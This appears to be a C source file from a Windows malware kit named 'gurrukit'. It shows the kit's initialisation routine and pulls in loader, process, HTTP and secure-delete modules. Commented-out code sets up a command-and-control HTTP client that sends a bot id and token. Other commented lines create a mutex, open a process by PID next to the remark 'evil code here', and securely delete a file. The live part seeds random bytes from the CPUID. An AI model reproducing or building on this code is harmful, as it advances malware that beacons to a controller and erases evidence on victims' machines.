#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "include/gurrukit.h"
#include "include/config.h"
#include "include/sys.h"
#include "include/external/slre.h"
#include "include/external/ldasm.h"
#include "include/external/xml.h"
#include "include/regextract.h"
#include "include/misc.h"
#include "include/memory.h"
#include "include/nt.h"
#include "include/http.h"
#include "include/process.h"
#include "include/sdelete.h"
#include "include/gurru.h"



int gurruInit(BOOL isMut) {
	NtLoader();
	/*
	isMutex = 1;
	ImageBase = sysGetImageBase();
	RegExtractStruct Extract;

	CreateMutexW(NULL, TRUE, MUTEX_NAME);
	if (RegExtractA(&Extract, "Washington post :23|2300 Ascri") == TRUE) {
		MessageBoxW(NULL, L"lalaA", L"lall", 0);
	}
	*/
/*
	NtLoader();
	HANDLE a = ProcCreate(848);
	//evil code here!!! :D
*/
	
	CCHTTP cc;


	/*
	ZeroMemory(&cc, sizeof(CCHTTP));
	LoadLibrary("wininet.dll");
	cc.wHost = hosts[0];
	cc.wUserAgent = USER_AGENT;
	cc.wURL = urls[0];
	cc.usPort = 80;
	httpInit(&cc);
	httpSend(&cc, L"bid=lalala&option=2&token=dasadsdds");
	*/

	wchar_t *test=MemoryAlloc(2048);
	NtLoader();
	unsigned char lala[2000];
	int i = 0;
	for (i = 0; i < 255; i++) {
		lala[i] = random_byte(nGetCPUID(), 255, 0x796e654a);
		//lala[i] = b;
	}
	//GetCPUID(test);
	//MessageBoxW(NULL, test, L"AAAA", 0);
	//sdeleteDelFile(L"\\\\?\\globalroot\\Users\\pumu\\lala.txt");
	return(0);
}

BOOL gurruIsMutex(void) {
	return(isMutex);
}
/*
unsigned long gurruImageBase(void) {
	return(ImageBase);
}
*/